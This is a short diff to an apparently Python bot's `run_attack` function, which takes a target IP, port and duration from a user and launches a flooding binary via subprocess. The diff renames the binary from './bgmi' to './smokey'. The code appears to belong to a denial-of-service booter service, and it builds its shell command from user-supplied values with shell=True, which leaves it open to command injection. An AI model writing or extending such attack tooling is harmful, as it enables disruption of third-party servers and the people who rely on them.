@@ -380,7 +380,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
 
     try:
         # Simulate the attack command with dynamic thread
-        command = f"./bgmi {ip} {port} {time_duration} {30} {default_thread}"
+        command = f"./smokey {ip} {port} {time_duration} {30} {default_thread}"
         process = subprocess.Popen(command, shell=True)
 
         # Wait for the specified duration
